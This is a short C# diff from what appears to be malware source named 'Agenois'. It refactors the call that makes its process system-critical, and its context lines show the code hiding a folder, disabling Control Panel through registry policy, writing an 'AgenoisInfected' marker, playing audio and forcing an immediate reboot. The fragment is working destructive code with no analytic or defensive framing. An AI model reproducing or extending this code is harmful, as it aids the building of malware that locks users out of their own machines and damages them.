@@ -40,7 +40,7 @@ namespace Agenois
                 DirectoryInfo ch = new DirectoryInfo(extractPath);
                 ch.Attributes = FileAttributes.Hidden;
                 
-                Destructive.EnableCriticalMode();
+                Destructive.CriticalMode(1);
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                 editKey.SetValue("NoControlPanel", "1");
@@ -190,11 +190,12 @@ namespace Agenois
                 editKey.SetValue("AgenoisInfected", "1");
                 editKey.Close();
 
+                Destructive.CriticalMode(0);
                 Others.StartProcess("shutdown.exe", "/r /t 0");
             }
             else
             {
-                Destructive.EnableCriticalMode();
+                Destructive.CriticalMode(1);
 
                 SoundPlayer soundPlayer = new SoundPlayer(Resources.Audio);
                 soundPlayer.Play();
